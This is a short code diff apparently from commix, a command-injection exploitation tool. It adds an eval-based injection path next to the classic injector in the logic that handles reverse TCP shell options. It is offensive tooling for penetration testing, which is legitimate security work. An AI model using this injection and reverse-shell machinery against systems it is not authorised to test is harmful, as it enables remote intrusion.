@@ -27,6 +27,7 @@ from src.thirdparty.colorama import Fore, Back, Style, init
 
 from src.core.shells import reverse_tcp
 from src.core.injections.results_based.techniques.classic import cb_injector
+from src.core.injections.results_based.techniques.eval_based import eb_injector
 
 """
 Check commix shell options
@@ -70,12 +71,17 @@ def check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_m
           settings.REVERSE_TCP = False
         return go_back, go_back_again
 
-      # Command execution results.
-      whitespace = settings.WHITESPACE[0]
-      response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-
-      # Evaluate injection results.
-      shell = cb_injector.injection_results(response, TAG, cmd)
+      if settings.EVAL_BASED_STATE != False:
+        # Command execution results.
+        response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+        # Evaluate injection results.
+        shell = eb_injector.injection_results(response, TAG, cmd)
+      else:
+        # Command execution results.
+        whitespace = settings.WHITESPACE[0]
+        response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+        # Evaluate injection results.
+        shell = cb_injector.injection_results(response, TAG, cmd)
       if settings.VERBOSITY_LEVEL >= 1:
         print ""
       err_msg = "The reverse TCP connection has failed!"
